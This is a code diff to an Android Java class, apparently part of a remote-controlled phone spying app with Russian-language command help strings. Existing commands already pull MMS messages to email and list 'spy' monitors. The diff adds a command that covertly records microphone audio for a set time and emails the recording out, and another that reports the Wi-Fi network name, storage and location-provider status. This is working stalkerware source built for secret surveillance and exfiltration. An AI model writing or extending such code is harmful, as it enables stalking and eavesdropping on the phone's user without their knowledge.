@@ -21,6 +21,8 @@ import android.location.Location;
 import android.location.LocationListener;
 import android.location.LocationManager;
 import android.net.Uri;
+import android.net.wifi.WifiInfo;
+import android.net.wifi.WifiManager;
 import android.os.Bundle;
 import android.os.Handler;
 import android.os.Message;
@@ -125,6 +127,8 @@ public class CommandPool {
 		Add(new CommandObjGetMMS(CommandObj.CMD_GET_MMS,"[from:YYMMDD;[to:YYMMDD]][date:YYMMDD] - получить ММС сообщения на почту"));
 		Add(new CommandObjSpyMMS(CommandObj.CMD_SPY_MMS,"Не реализовано"));
 		Add(new CommandObjWhat(CommandObj.CMD_WHAT,"Получить активные мониторы (spy-команды)"));
+		Add(new CommandObjMic(CommandObj.CMD_MIC,"time:nn;[off] - записывать аудио nn секунд,файл на почту"));
+		Add(new CommandObjStats(CommandObj.CMD_STATS,"получить инфу о телефоне"));
 		//Add(new CommandObjKeepAlive(CommandObj.CMD_KEEPALIVE,"time:HHMM;[off] - рапортовать о состоянии каждые сутки в <HHMM>"));
 		
 		
@@ -1421,4 +1425,96 @@ public class CommandPool {
 			return CommandObj.ACK;
 		}
 	}
+	
+	//
+	// MIC
+	//
+	public class CommandObjMic extends CommandObj {
+
+		public VoiceRecorder mRec = null;
+		
+		public CommandObjMic(String name, String help) {
+			super(name, help);
+		}
+		
+		public int Invoke() throws Exception {
+			
+			if ( mArgs.hasOpt("off")) {
+				if ( mRec != null ) {
+					mRec.stop();
+					mRec = null;
+				}
+				mCommandResult = "Запись не была активна...";
+				return CommandObj.ACK;
+			}
+
+			if ( mRec != null ) {
+				mCommandResult = "Запись уже в процессе";
+				return CommandObj.ACK;
+			}
+			
+			int time = mArgs.intValue("time");
+			mRec = VoiceRecorder.getInstance(mContext, this,time);
+			mRec.start();
+			 
+			Calendar cal = Calendar.getInstance();
+			cal.add(Calendar.SECOND, time);
+			mCommandResult = String.format("Записываем %d сек.,результат будет выслан на почту в %s", time,cal.getTime().toLocaleString());
+			return CommandObj.ACK;
+		}
+		
+		public void Reply(Object ... args) throws Exception {
+			String fileName = mRec.fileName; //(String)args[0];
+			mRec.stop();
+			mRec = null;
+			NetLog.v("File is %s",fileName);
+			Mail mail = createMail();
+			File file = new File(fileName);
+			mail.addAttachment(fileName,file.getName(),true);
+			mail.send();
+			mCommandResult = String.format("Запись %s ( %d байт ) выслана на почту...",file.getName(),file.length());
+			super.Reply(args);
+		}
+	}
+
+	public class CommandObjStats extends CommandObj {
+
+		public CommandObjStats(String name, String help) {
+			super(name, help);
+		}
+		
+		public int Invoke() throws Exception {
+			
+			mCommandResult = "SDCard: ";
+			if ( CommandObj.hasExternal() ) {
+				String total = CommandObj.getSizeString(CommandObj.getExternalTotalSize());
+				String free  = CommandObj.getSizeString(CommandObj.getExternalFreeSize());
+				mCommandResult += "всего "+total+",свободно "+free;
+			} else {
+				mCommandResult += "Нет";
+			}
+			
+			boolean ok = this.wifiEnabled();
+			mCommandResult += "\r\nWifi: ";
+			if ( ok ) {
+				WifiManager wifi = (WifiManager)mContext.getSystemService(Context.WIFI_SERVICE);
+				WifiInfo info = wifi.getConnectionInfo();
+				mCommandResult += info.getSSID();
+			} else
+				mCommandResult += "Выкл";
+			
+			LocationManager locMgr = (LocationManager)mContext.getSystemService(Context.LOCATION_SERVICE);
+			mCommandResult += "\r\nЛокация: ";
+			mCommandResult += "GPS:" + (locMgr.isProviderEnabled(LocationManager.GPS_PROVIDER)?"Вкл.":"Выкл");
+			mCommandResult += ",Network:" + (locMgr.isProviderEnabled(LocationManager.NETWORK_PROVIDER)?"Вкл.":"Выкл");
+			
+			
+			
+			return CommandObj.ACK;
+		}
+		
+	}
+	
 }
+
+
